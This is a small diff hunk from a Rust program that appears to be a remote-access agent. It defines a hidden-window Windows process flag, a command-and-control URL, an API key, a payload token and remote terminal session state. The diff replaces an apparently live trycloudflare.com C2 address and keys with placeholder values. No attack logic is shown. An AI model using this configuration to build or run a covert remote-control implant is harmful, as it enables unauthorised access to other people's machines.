@@ -12,9 +12,9 @@ use std::os::windows::process::CommandExt;
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-const C2_URL: &str = "https://mandatory-zip-installing-illinois.trycloudflare.com";
-const API_KEY: &str = "964fb7928cd27b5faf3b8971e5befcf6";
-const PAYLOAD_TOKEN: &str = "57c36cda7fe1823797273b065ea3b8f8";
+const C2_URL: &str = "https://CHANGE-MECHANGE-ME.trycloudflare.com";
+const API_KEY: &str = "00000000000000000000000000000000";
+const PAYLOAD_TOKEN: &str = "00000000000000000000000000000000";
 
 static PTY_RUNNING: AtomicBool = AtomicBool::new(false);
 static PTY_SESSION_ID: AtomicU64 = AtomicU64::new(0);
